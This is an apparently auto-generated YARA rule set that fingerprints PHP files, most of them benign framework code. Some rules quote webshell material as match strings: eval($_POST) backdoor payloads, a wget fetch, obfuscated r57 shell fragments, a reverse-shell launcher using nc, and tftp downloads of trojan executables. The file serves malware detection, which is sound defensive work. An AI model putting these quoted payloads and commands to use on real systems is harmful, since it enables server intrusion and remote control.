      $s8 = "if ($unserialized !== $value || (false !== strpos($serialized, ';R:') && preg_match('/;R:[1-9]/', $serialized))) {" fullword ascii
      $s9 = "$file = $this->getFile($key, true);" fullword ascii
      $s10 = "$allowCompile = 'cli' !== PHP_SAPI || ini_get('opcache.enable_cli');" fullword ascii
      $s11 = "$ok = $this->write($file, '<?php return '.var_export($data, true).';') && $ok;" fullword ascii
      $s12 = "$data = array($lifetime ? time() + $lifetime : PHP_INT_MAX, '');" fullword ascii
      $s13 = "$pruned = @unlink($file) && !file_exists($file) && $pruned;" fullword ascii
      $s14 = "return function_exists('opcache_invalidate') && ini_get('opcache.enable');" fullword ascii
      $s15 = "throw new CacheException(sprintf('Cache directory is not writable (%s)', $this->directory));" fullword ascii
      $s16 = "// Serialize strings if they could be confused with serialized objects or arrays" fullword ascii
      $s17 = "use FilesystemCommonTrait;" fullword ascii
      $s18 = "$file = $this->getFile($id);" fullword ascii
      $s19 = "if ('N;' === $value || (isset($value[2]) && ':' === $value[1])) {" fullword ascii
      $s20 = "set_error_handler($this->includeHandler);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule RequestApproved
{
   meta:
      description = "php22 - file RequestApproved.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "58d2e77995d05366bf147d58a3cd70a438f0b68a569f0d3216e483334a19e009"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "* @link https://www.humhub.org/" fullword ascii
      $s3 = "* @copyright Copyright (c) 2017 HumHub GmbH & Co. KG" fullword ascii
      $s4 = "* Friends Request" fullword ascii
      $s5 = "'displayName' => Html::tag('strong', Html::encode($this->originator->displayName))," fullword ascii
      $s6 = "return $this->originator->getUrl();" fullword ascii
      $s7 = "public function getMailSubject()" fullword ascii
      $s8 = "* @inheritdoc" fullword ascii
      $s9 = "use humhub\\modules\\notification\\components\\BaseNotification;" fullword ascii
      $s10 = "return Yii::t('FriendshipModule.notification', '{displayName} accepted your friend request.', [" fullword ascii
      $s11 = "public $viewName = \"friendshipApproved\";" fullword ascii
      $s12 = "return strip_tags($this->html());" fullword ascii
      $s13 = "public $markAsSeenOnClick = true;" fullword ascii
      $s14 = "public $moduleId = \"friendship\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_of
{
   meta:
      description = "php22 - file of.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "83c12f88e528a6a2d71ed0c17c7607da1eac69f5db2569142d8b0cfaf38e7ce5"
   strings:
      $s1 = "$title = elgg_echo(\"friends:of:owned\", [$owner->getDisplayName()]);" fullword ascii
      $s2 = "* @subpackage Social.Friends" fullword ascii
      $s3 = "'relationship_guid' => $owner->getGUID()," fullword ascii
      $s4 = "* Elgg friends of page" fullword ascii
      $s5 = "* @package Elgg.Core" fullword ascii
      $s6 = "$owner = elgg_get_page_owner_entity();" fullword ascii
      $s7 = "$content = elgg_list_entities([" fullword ascii
      $s8 = "if (!$owner instanceof ElggUser) {" fullword ascii
      $s9 = "$body = elgg_view_layout('one_sidebar', $params);" fullword ascii
      $s10 = "// needed for correct registration of menu items" fullword ascii
      $s11 = "throw new \\Elgg\\EntityNotFoundException;" fullword ascii
      $s12 = "'no_results' => elgg_echo('friends:none')," fullword ascii
      $s13 = "echo elgg_view_page($title, $body);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule php22_parent
{
   meta:
      description = "php22 - file parent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59f482b694c992310c353c87857254333ff96b09cfb1e2697b456f6a195fb0d2"
   strings:
      $s1 = "* @uses $vars['entity']         Optional. The child entity (uses container_guid)" fullword ascii
      $s2 = "* @uses $vars['options_values']" fullword ascii
      $s3 = "$container = $entity->getContainerEntity();" fullword ascii
      $s4 = "$pages = pages_get_navigation_tree($container);" fullword ascii
      $s5 = "$container = elgg_get_page_owner_entity();" fullword ascii
      $s6 = "* @uses $vars['value']          The current value, if any" fullword ascii
      $s7 = "* @uses $vars['name']           The name of the input field" fullword ascii
      $s8 = "* Parent picker" fullword ascii
      $s9 = "$options[$page['guid']] = \"$spacing \" . $page['title'];" fullword ascii
      $s10 = "$entity = elgg_extract('entity', $vars);" fullword ascii
      $s11 = "$spacing .= str_repeat('--', $page['depth']);" fullword ascii
      $s12 = "$vars = array_merge($defaults, $vars);" fullword ascii
      $s13 = "echo elgg_view('input/select', $vars);" fullword ascii
      $s14 = "if ($entity instanceof ElggPage) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule ResolveBindingsPassTest
{
   meta:
      description = "php22 - file ResolveBindingsPassTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "863ad05180f154807d64a668c28234dd0e173b2a894b61b95defc5ef27b4a776"
   strings:
      $x1 = "* @expectedException \\Symfony\\Component\\DependencyInjection\\Exception\\InvalidArgumentException" fullword ascii
      $s2 = "use Symfony\\Component\\DependencyInjection\\Compiler\\AutowireRequiredMethodsPass;" fullword ascii
      $s3 = "use Symfony\\Component\\DependencyInjection\\Compiler\\ResolveBindingsPass;" fullword ascii
      $s4 = "* @expectedExceptionMessage Unused binding \"$quz\" in service \"Symfony\\Component\\DependencyInjection\\Tests\\Fixtures\\Named" ascii
      $s5 = "* @expectedExceptionMessage Unused binding \"$quz\" in service \"Symfony\\Component\\DependencyInjection\\Tests\\Fixtures\\Named" ascii
      $s6 = "(new ResolveBindingsPass())->process($container);" fullword ascii
      $s7 = "use Symfony\\Component\\DependencyInjection\\Tests\\Fixtures\\NamedArgumentsDummy;" fullword ascii
      $s8 = "(new AutowireRequiredMethodsPass())->process($container);" fullword ascii
      $s9 = "namespace Symfony\\Component\\DependencyInjection\\Tests\\Compiler;" fullword ascii
      $s10 = "use Symfony\\Component\\DependencyInjection\\Argument\\BoundArgument;" fullword ascii
      $s11 = "use Symfony\\Component\\DependencyInjection\\TypedReference;" fullword ascii
      $s12 = "use Symfony\\Component\\DependencyInjection\\Tests\\Fixtures\\CaseSensitiveClass;" fullword ascii
      $s13 = "use Symfony\\Component\\DependencyInjection\\Reference;" fullword ascii
      $s14 = "$pass->process($container);" fullword ascii
      $s15 = "$this->assertEquals(array(new Reference('foo')), $container->getDefinition('def2')->getArguments());" fullword ascii
      $s16 = "$this->assertEquals(array(array('setDefaultLocale', array('fr'))), $definition->getMethodCalls());" fullword ascii
      $s17 = "$this->assertEquals(array($typedRef), $container->getDefinition('def1')->getArguments());" fullword ascii
      $s18 = "$this->assertEquals(array(array('setSensitiveClass', array(new Reference('foo')))), $definition->getMethodCalls());" fullword ascii
      $s19 = "$this->assertEquals(array(new Reference('foo'), '123'), $definition->getArguments());" fullword ascii
      $s20 = "public function testProcess()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule Observer
{
   meta:
      description = "php22 - file Observer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5f48ab557492d5541634ccf6b963d224c264794785b083d836456a81d6e8c7ac"
   strings:
      $s1 = "* @license    https://github.com/padraic/humbug/blob/master/LICENSE New BSD License" fullword ascii
      $s2 = "draic Brady (http://blog.astrumfutura.com)" fullword ascii
      $s3 = "* @copyright  Copyright (c) 2015 P" fullword ascii
      $s4 = "* @param Result $result" fullword ascii
      $s5 = "* Called when the initial unit test suite is started." fullword ascii
      $s6 = "* @author     Thibaud Fabre" fullword ascii
      $s7 = "* Called upon progress of the test suite." fullword ascii
      $s8 = "* Called when the unit test stops." fullword ascii
      $s9 = "* @package    Humbug" fullword ascii
      $s10 = "public function onStopSuite(Result $result);" fullword ascii
      $s11 = "namespace Humbug\\TestSuite\\Unit;" fullword ascii
      $s12 = "public function onProgress($count);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule PhpSuperGlobalsConverter
{
   meta:
      description = "php22 - file PhpSuperGlobalsConverter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4795de5d30cdc091b1923aff67172734e91eb264318c60da800f29cf6f706c54"
   strings:
      $s1 = "* Convert from ['a' => ['tmp_name' => '/tmp/test.txt'] ]" fullword ascii
      $s2 = "* Converts BrowserKit\\Request's request parameters and files into PHP-compatible structure" fullword ascii
      $s3 = "* to ['tmp_name' => ['a' => '/tmp/test.txt'] ]" fullword ascii
      $s4 = "* so we can ignore element itself and only process inner files" fullword ascii
      $s5 = "* Rearrange files array to be compatible with PHP $_FILES superglobal structure" fullword ascii
      $s6 = "* this will check if current element contains inner arrays within it's keys" fullword ascii
      $s7 = "* @see https://bugs.php.net/bug.php?id=25589" fullword ascii
      $s8 = "* @see https://bugs.php.net/bug.php?id=40000" fullword ascii
      $s9 = "* then only array variable will be used while simple variable will be ignored in php $_FILES" fullword ascii
      $s10 = "* Replace spaces and dots and other chars in high-level query parameters for" fullword ascii
      $s11 = "* (notice there is no entry for file \"foo\", only for file \"foo[bar]\"" fullword ascii
      $s12 = "* compatibility with PHP bug (or not a bug)" fullword ascii
      $s13 = "* @param array $parameters Array of request parameters to be converted" fullword ascii
      $s14 = "* to be compatible with PHP \"bug\"" fullword ascii
      $s15 = "* @package Codeception\\Lib\\Connector" fullword ascii
      $s16 = "* Escape high-level variable name with dots, underscores and other \"special\" chars" fullword ascii
      $s17 = "* <input type=\"file\" name=\"foo[bar]\" />" fullword ascii
      $s18 = "* If we have a form with fields like" fullword ascii
      $s19 = "* <input type=\"file\" name=\"foo\" />" fullword ascii
      $s20 = "* @param array $requestFiles" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PHP_reflection
{
   meta:
      description = "php22 - file PHP_reflection.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8b6c43039e76465174fba09ae480fe59a496951fe579ed19c805caa96d4536a6"
   strings:
      $s1 = "http://xx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?php eval($_POST[c]);?> //" fullword ascii
      $s2 = "http://xxx.xxx/md.php?m=file_put_contents&c=test11.php&id=<?php @eval($_POST[c]);?> //" fullword ascii
      $s3 = "//news.php?=msystem&c= wget http://xxx.xxx/igenus/images/suffix/test11.php //" fullword ascii
      $s4 = "mu201405.php?m=system&c=echo ^<?php eval($_POST[c]); //" fullword ascii
      $s5 = "echo $func->invokeArgs(array($_GET[c],$_GET[id]));" fullword ascii
      $s6 = "$func = new ReflectionFunction($_GET[m]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_r57__8_
{
   meta:
      description = "php22 - file r57 (8).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e6488371bba94e5b1333d71fdc24e6b4324f1e05da9bf9ae29ab0c8bd3f500c"
   strings:
      $x1 = "\";${\"G\\x4c\\x4f\\x42ALS\"}[\"\\x67ht\\x6e\\x6c\\x64\\x65\\x65\"]=\"\\x63r\\x63\";${\"\\x47\\x4cOB\\x41L\\x53\"}[\"cf\\x76\\x7" ascii
      $x2 = "<?php ${\"G\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x6e\\x62\\x62\\x78\\x78g\"]=\"\\x6f\\x72\\x61_\\x6f\\x6e\";${\"\\x47LO\\x42\\x41L" ascii
      $s3 = "s->dump[2]=\"\\x23\\x23 \\x20\\x43\\x72ea\\x74e\\x64:\\x20\".date(\"d/m/\\x59 H:i:s\");$this->dump[3]=\"\\x23\\x23\\x20\\x44\\x6" ascii
      $s4 = "ar$pass='';var$base='';var$db='';var$connection;var$res;var$error;var$rows;var$columns;var$num_rows;var$num_fields;var$dump;func" ascii
      $s5 = "\\x62\\x6c\\x65\"];$this->dump[]=\"## ---------------------------------------\\x20\";if($this->query(\"/*\".chr(0).\"*/\\x20S\\x" ascii
      $s6 = "63aid\\x66qk\\x75\\x6b\"]}))){$this->error=\"Que\\x72y parse\\x20error\";}else{if(@ociexecute($this->res)){if(@ocirowcount($this" ascii
      $s7 = "\\x77\\x71\\x76\\x74\\x6et\\x73\"]},${${\"\\x47L\\x4fB\\x41LS\"}[\"\\x6e\\x6b\\x77\\x6bia\\x62\"]},10);if(@ftp_login(${$msfoxvfr" ascii
      $s8 = "41L\\x53\"}[\"\\x69\\x63\\x64\\x62k\\x7au\\x73\\x63\\x73b\"]},${$miakvsebdfra},10);if(@ftp_login(${$pxwhgnywp},${${\"GL\\x4f\\x4" ascii
      $s9 = "\\x4\";$ytieywepig=\"\\x6eam\\x65\";${${\"G\\x4cOB\\x41\\x4c\\x53\"}[\"\\x66\\x67\\x6df\\x73x\\x62\\x64\\x74w\\x6d\"]}.=\"" fullword ascii
      $s10 = "20\".$this->base;$this->dump[4]=\"#\\x23\\x20\\x20\\x20\\x20\\x54a\\x62\\x6ce:\\x20\".${$cetvkp};${\"GLO\\x42\\x41L\\x53\"}[\"" ascii
      $s11 = "cce\\x73s\\n\";$mofickyq=\"\\x73\\x75c\";${$mofickyq}++;}else if(isset($_POST[\"\\x72eve\\x72s\\x65\"])){if(@ftp_login(${${\"G" ascii
      $s12 = "->db=$_POST[\"d\\x62\"];$sql->host=$_POST[\"\\x64b_se\\x72\\x76e\\x72\"];$sql->port=$_POST[\"\\x64b\\x5f\\x70\\x6fr\\x74\"];$sql" ascii
      $s13 = "login(${${\"\\x47\\x4c\\x4fBAL\\x53\"}[\"f\\x63\\x6e\\x68\\x63\\x71\\x6e\\x7a\"]},$_POST[\"ftp_\\x6c\\x6f\\x67\\x69\\x6e\"],$_PO" ascii
      $s14 = "x45\\x20`\".${$faeguoekf}.\"`\")!=1)return 0;if(!$this->get_result())return 0;$this->dump[]=$this->rows[0][\"Cr\\x65\\x61\\x74e" ascii
      $s15 = "i\\x6b\\x72\\x74\"]})&&($_POST[\"\\x63\\x6dd\"]!=\"ph\\x70\\x5f\\x65\\x76\\x61\\x6c\")&&($_POST[\"c\\x6dd\"]!=\"\\x6d\\x79s\\x71" ascii
      $s16 = "l->select_db()){echo\"[-] \\x45R\\x52O\\x52\\x21\\x20C\\x61n't \\x73e\\x6c\\x65ct \\x64\\x61\\x74\\x61b\\x61\\x73e\";}else if(!$" ascii
      $s17 = "x70_l\\x6fg\\x69n\"],${$roaouutmpy})){echo\"[+]\\x20\".$_POST[\"ftp_\\x6c\\x6fgi\\x6e\"].\":$user\\x20- \\x73\\x75\\x63\\x63\\x6" ascii
      $s18 = "x74mp/grep.txt;c\\x61t /\\x74\\x6d\\x70/grep\\x2etxt\",\"l\\x6f\\x63\\x61\\x74\\x65\\x20e\\x72r\\x6f\\x72_log fil\\x65\\x73\\x20" ascii
      $s19 = "74e\\x72r\\x75\\x70\\x74s\";}if(isset($_GET[\"re\\x61\\x6c\\x69\\x73\\x65\\x31\"])){$_POST[\"cmd\"]=\"c\\x61t /e\\x74\\x63/*\\x7" ascii
      $s20 = ":(\"root\"))).\" <\\x62\\x3e:\\x3c/b\\x3e\\x20\".in(\"\\x74\\x65x\\x74\",\"m\\x79s\\x71\\x6c_p\",8,(!empty($_POST[\"mys\\x71l_" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule php22_QPXSL
{
   meta:
      description = "php22 - file QPXSL.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4eee3322f70fb98474399a12bcdf342b23424d0c366e54631fdfd8c58714d0e0"
   strings:
      $s1 = "* This will attempt to read the provided stylesheet and then" fullword ascii
      $s2 = "* @license http://opensource.org/licenses/lgpl-2.1.php LGPL or MIT-like license." fullword ascii
      $s3 = "* execute it on the current source document." fullword ascii
      $s4 = "* stylesheet.xml. The results are returned as a QueryPath object, which " fullword ascii
      $s5 = "*  A QueryPath object wrapping the transformed document. Note that this is a " fullword ascii
      $s6 = "* Provide QueryPath with XSLT support using the PHP libxslt module." fullword ascii
      $s7 = "* Provide tools for running XSL Transformation (XSLT) on a document." fullword ascii
      $s8 = "* This will transform src.xml according to the XSLT rules in " fullword ascii
      $s9 = "return qp($processor->transformToDoc($sourceDoc));" fullword ascii
      $s10 = "* qp('src.xml')->xslt('stylesheet.xml')->writeXML();" fullword ascii
      $s11 = "* Given an XSLT stylesheet, run a transformation." fullword ascii
      $s12 = "* of the PHP extension that provides libxslt support." fullword ascii
      $s13 = "* This extension provides the {@link QPXSL::xslt()} function, which transforms" fullword ascii
      $s14 = "* a source XML document into another XML document according to the rules in" fullword ascii
      $s15 = "* You must have PHP XSL support for this to function." fullword ascii
      $s16 = "*  <i>different</em> document than the original. As such, it has no history." fullword ascii
      $s17 = "$processor->importStylesheet($styleDoc);" fullword ascii
      $s18 = "* require 'QueryPath/Extension/QPXSL.php';" fullword ascii
      $s19 = "* @author M Butcher <matt@aleph-null.tv>" fullword ascii
      $s20 = "*  This takes a QueryPath object or <em>any</em> of the types that the " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      8 of them
}

rule OutlineChooser
{
   meta:
      description = "php22 - file OutlineChooser.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "51b1cd6eba2cea2808161603929787d5c64311b79d99aaa0323f6be4e6f60ce1"
   strings:
      $x1 = "* @author    RocketTheme http://www.rockettheme.com" fullword ascii
      $s2 = "* @copyright Copyright (C) 2007 - 2017 RocketTheme, LLC" fullword ascii
      $s3 = "* http://www.gnu.org/licenses/gpl-2.0.html" fullword ascii
      $s4 = "* @license   GNU/GPLv2 and later" fullword ascii
      $s5 = "namespace Gantry\\Framework;" fullword ascii
      $s6 = "* @deprecated 5.3.0" fullword ascii
      $s7 = "* @package   Gantry5" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}


rule RandomInvoiceNumberGeneratorSpec
{
   meta:
      description = "php22 - file RandomInvoiceNumberGeneratorSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "88faf60aa66c88b2887f2f470893a0246689df07254ed7889374d38cd77274dd"
   strings:
      $s1 = "function it_generates_a_random_invoice_number(OrderInterface $order, PaymentInterface $payment): void" fullword ascii
      $s2 = "use Sylius\\Component\\Core\\Payment\\InvoiceNumberGeneratorInterface;" fullword ascii
      $s3 = "use Sylius\\Component\\Core\\Payment\\RandomInvoiceNumberGenerator;" fullword ascii
      $s4 = "namespace spec\\Sylius\\Component\\Core\\Payment;" fullword ascii
      $s5 = "use Sylius\\Component\\Core\\Model\\PaymentInterface;" fullword ascii
      $s6 = "$this->generate($order, $payment)->shouldBeString();" fullword ascii
      $s7 = "function it_is_an_invoice_number_generator(): void" fullword ascii
      $s8 = "function it_is_initializable(): void" fullword ascii
      $s9 = "final class RandomInvoiceNumberGeneratorSpec extends ObjectBehavior" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule OptionsResolverTest
{
   meta:
      description = "php22 - file OptionsResolverTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cb546c80565f18a22d89ec2ea7017a9f8e52e9ab2beb1d9753192c7c70bffd0e"
   strings:
      $s1 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\UndefinedOptionsException" fullword ascii
      $s2 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\OptionDefinitionException" fullword ascii
      $s3 = "* @expectedExceptionMessage The optional option \"defined\" has no value set. You should make sure it is set with \"isset\" bef" fullword ascii
      $s4 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\MissingOptionsException" fullword ascii
      $s5 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\NoSuchOptionException" fullword ascii
      $s6 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException" fullword ascii
      $s7 = "* @expectedExceptionMessage The option \"foo\" with value 42 is invalid. Accepted values are: \"bar\", false, null." fullword ascii
      $s8 = "* @expectedExceptionMessage The options \"baz\", \"foo\", \"ping\" do not exist. Defined options are: \"a\", \"z\"." fullword ascii
      $s9 = "* @expectedException \\Symfony\\Component\\OptionsResolver\\Exception\\AccessException" fullword ascii
      $s10 = "* @expectedExceptionMessage The option \"undefined\" does not exist. Defined options are: \"foo\", \"lazy\"." fullword ascii
      $s11 = "* @expectedExceptionMessage The option \"foo\" with value null is invalid. Accepted values are: \"bar\"." fullword ascii
      $s12 = "* @expectedExceptionMessage The option \"foo\" with value 42 is invalid. Accepted values are: \"bar\"." fullword ascii
      $s13 = "* @expectedExceptionMessage The option \"foo\" does not exist. Defined options are: \"a\", \"z\"." fullword ascii
      $s14 = "$this->setExpectedException('Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException', $exceptionMessage" fullword ascii
      $s15 = "$this->setExpectedException('Symfony\\Component\\OptionsResolver\\Exception\\InvalidOptionsException', $exceptionMessage);" fullword ascii
      $s16 = "array(new OptionsResolver(), 'string', 'The option \"option\" with value Symfony\\Component\\OptionsResolver\\OptionsReso" fullword ascii
      $s17 = "lver is expected to be of type \"string\", but is of type \"Symfony\\Component\\OptionsResolver\\OptionsResolver\".')," fullword ascii
      $s18 = "$this->assertSame(array('foo', 'bar', 'baz', 'boo'), $this->resolver->getDefinedOptions());" fullword ascii
      $s19 = "* only a subset of the defined options). Outside of resolve(), it's not" fullword ascii
      $s20 = "* In resolve() we count the options that are actually set (which may be" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule PhotoQuery
{
   meta:
      description = "php22 - file PhotoQuery.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e30eff56e05474c103f18526f32884c577cf417fc3361792d150c01b871c1741"
   strings:
      $s1 = "* Set the photo ID to query for. When set, this photo's comments/tags" fullword ascii
      $s2 = "* will be returned. If not set or null, the default user's feed will be" fullword ascii
      $s3 = "* Assists in constructing queries for comment/tag entries." fullword ascii
      $s4 = "* Get the photo ID which is to be returned." fullword ascii
      $s5 = "* @version    $Id: PhotoQuery.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s6 = "* Returns the URL generated for this query, based on it's current" fullword ascii
      $s7 = "* @param string $value The ID of the photo to retrieve, or null to" fullword ascii
      $s8 = "* @return string A URL generated based on the state of this query." fullword ascii
      $s9 = "* For information on submitting queries to a server, see the" fullword ascii
      $s10 = "* @throws Zend_Gdata_App_InvalidArgumentException" fullword ascii
      $s11 = "* @return string The ID of the photo to retrieve." fullword ascii
      $s12 = "public function getQueryUrl($incomingUri = '')" fullword ascii
      $s13 = "* The ID of the photo to query for." fullword ascii
      $s14 = "* Instances of this class can be provided in many places where a URL is" fullword ascii
      $s15 = "* service class, Zend_Gdata_Photos." fullword ascii
      $s16 = "$uri .= '/photoid/' . $this->getPhotoId();" fullword ascii
      $s17 = "// require_once 'Zend/Gdata/App/InvalidArgumentException.php';" fullword ascii
      $s18 = "* @subpackage Photos" fullword ascii
      $s19 = "* returned instead." fullword ascii
      $s20 = "if ($this->getPhotoId() !== null) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule phpshell_php
{
   meta:
      description = "php22 - file phpshell.php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7f77c12b04b0cc7bbd66b3810ea83f049536b313d8c9defadcf1f442a782a0e"
   strings:
      $s1 = "getFile($_POST['p']!=''?$_POST['p']:$_SERVER['DOCUMENT_ROOT'],$_POST['charset']!=''?$_POST['charset']:\"UTF-8\");" fullword ascii
      $s2 = "echo \"<a href=\\\"javascript:get('\".str_replace('\\\\','/',$path).\"/\".$file.\"');\\\">\".$file.\"</a><br>\";" fullword ascii
      $s3 = "http://www.XXX.com.cn/data/conf_ads.php?file=admin3.php&url=http://p2j.cn/1.txt" fullword ascii
      $s4 = "header(\"Content-Type:text/html;charset=\".$charset);" fullword ascii
      $s5 = "document.getElementById('action').value = \"get\";" fullword ascii
      $s6 = "<input type=\\\"button\\\" style=\\\"margin-left:20px;\\\" value=\\\"update\\\" onclick=\\\"update('update')\\\" />" fullword ascii
      $s7 = "<input type=\\\"button\\\" style=\\\"margin-left:20px;\\\" value=\\\"delete\\\" onclick=\\\"update('delete')\\\" />" fullword ascii
      $s8 = "document.getElementById('action').value = act;" fullword ascii
      $s9 = "echo \"<form action=\\\"\\\" method=\\\"post\\\" id=\\\"fm\\\">\";" fullword ascii
      $s10 = "select '<?php file_put_contents(dirname(__FILE__).\"/\".$_GET['file'], file_get_contents($_GET['url']));?> into outfile'/var/www" ascii
      $s11 = "echo \"File:<input type=\\\"text\\\" style=\\\"width:350px;\\\" name=\\\"file\\\" value=\\\"\".$path.\"\\\" />" fullword ascii
      $s12 = "document.getElementById('fm').submit();" fullword ascii
      $s13 = "document.getElementById('p').value = p;" fullword ascii
      $s14 = "echo \"<script>history.back(-1);alert('ok');</script>\";" fullword ascii
      $s15 = "echo \"<script>history.back(-1);alert('delete ok');</script>\";" fullword ascii
      $s16 = "echo \"<textarea style=\\\"width:600px;height:500px;\\\" name=\\\"data\\\">\".htmlspecialchars(file_get_contents($path)).\"</tex" ascii
      $s17 = "echo \"<textarea style=\\\"width:600px;height:500px;\\\" name=\\\"data\\\">\".htmlspecialchars(file_get_contents($path)).\"</tex" ascii
      $s18 = "select '<?php file_put_contents(dirname(__FILE__).\"/\".$_GET['file'], file_get_contents($_GET['url']));?> into outfile'/var/www" ascii
      $s19 = "if(file_exists($_POST['file'])){" fullword ascii
      $s20 = "file_put_contents($filename, $data);" fullword ascii
   condition:
      uint16(0) == 0x7561 and filesize < 6KB and
      8 of them
}

rule ObjectTrait
{
   meta:
      description = "php22 - file ObjectTrait.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "12d2ee5df677ddfd26a75fc023b6b104899ea67429532fb0ddabaf6909092cac"
   strings:
      $s1 = "* Sets the attribute of a user info object to the specified value, and saves it in the database." fullword ascii
      $s2 = "$genericValue->setAttributeKey($attributeValue->getAttributeKey());" fullword ascii
      $s3 = "$controller = $attributeValue->getAttributeKey()->getController();" fullword ascii
      $s4 = "* @param AttributeKeyInterface | string $ak" fullword ascii
      $s5 = "// Create the generic value. This gets joined to any specific Attribute value objects later on." fullword ascii
      $s6 = "abstract public function getAttributeValueObject($ak, $createIfNotExists = false);" fullword ascii
      $s7 = "* @return \\Concrete\\Core\\Entity\\Attribute\\Value\\Value" fullword ascii
      $s8 = "$orm = \\Database::connection()->getEntityManager();" fullword ascii
      $s9 = "* @var $value AttributeValue\\AbstractValue" fullword ascii
      $s10 = "// If the passed $value object == EmptyRequestAttributeValue, we know we are dealing" fullword ascii
      $s11 = "$attributeValue = $this->getAttributeValueObject($ak, true);" fullword ascii
      $s12 = "* @param bool $createIfNotExists" fullword ascii
      $s13 = "public function getAttribute($ak, $mode = false)" fullword ascii
      $s14 = "* @return AttributeValue" fullword ascii
      $s15 = "$controller->saveForm($controller->post());" fullword ascii
      $s16 = "$value = $this->getAttributeValueObject($ak);" fullword ascii
      $s17 = "use Concrete\\Core\\Attribute\\Value\\EmptyRequestAttributeValue;" fullword ascii
      $s18 = "use Concrete\\Core\\Entity\\Attribute\\Value\\Value as AttributeValue;" fullword ascii
      $s19 = "// with a legacy attribute type that's not using Doctrine. We have not returned an" fullword ascii
      $s20 = "public function getAttributeValue($ak)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule OrderByUpdateDateDescendingCriteria
{
   meta:
      description = "php22 - file OrderByUpdateDateDescendingCriteria.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9634f17adf2d7fb412435cce82fac561f02ac37ca35f00531a4b2b53cd6fc423"
   strings:
      $s1 = "* @author  Johannes Schobel <johannes.schobel@googlemail.com>" fullword ascii
      $s2 = "* @param \\Prettus\\Repository\\Contracts\\RepositoryInterface $repository" fullword ascii
      $s3 = "* @param                                                   $model" fullword ascii
      $s4 = "use Prettus\\Repository\\Contracts\\RepositoryInterface as PrettusRepositoryInterface;" fullword ascii
      $s5 = "* Class OrderByUpdateDateDescendingCriteria" fullword ascii
      $s6 = "public function apply($model, PrettusRepositoryInterface $repository)" fullword ascii
      $s7 = "use App\\Ship\\Parents\\Criterias\\Criteria;" fullword ascii
      $s8 = "return $model->orderBy('updated_at', 'desc');" fullword ascii
      $s9 = "namespace App\\Ship\\Criterias\\Eloquent;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php22_phpspy_
{
   meta:
      description = "php22 - file phpspy-.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "faf4d727728e03670713e5000b6813499274a56b95a5b42f8f14d1e2f7d84777"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
